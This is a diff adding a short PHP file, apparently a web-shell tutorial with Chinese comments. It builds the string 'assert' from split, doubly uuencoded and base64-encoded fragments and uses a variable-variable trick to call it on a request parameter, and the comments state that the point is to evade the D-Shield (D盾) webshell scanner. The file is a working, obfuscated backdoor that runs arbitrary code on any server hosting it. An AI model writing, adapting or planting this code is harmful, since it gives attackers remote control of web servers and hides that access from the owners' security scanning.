@@ -1,0 +1,19 @@
+<?php
+
+//将ass进行convert编码之后在base64编码在convert编码之后在base64编码打印得到下面data中数据,$a=解码之后得ass
+$a=convert_uudecode(base64_decode(convert_uudecode(base64_decode("LDI3SUcsVFE2MzRNOTA2XF0KYAo="))));
+//调试得到a为ass
+//echo $a;
+//同样编码得到ert
+$b=convert_uudecode(base64_decode(convert_uudecode(base64_decode("LDI3SUssVE02NDRNOTA2XF0KYAo="))));
+//echo $b;
+//拼接得到assert
+$c=$a.$b;
+//为使D盾扫描不到文件，再次进行编码解码。
+$d=convert_uudecode(convert_uuencode($c));
+//为$_REQUEST进行赋值
+$s=$_REQUEST[6];
+//使用单引号
+$aa='s';
+//进行变量覆盖,使用assert($_REQUEST[]),使D盾中发现不了$_REQUEST[]
+$d($$aa);
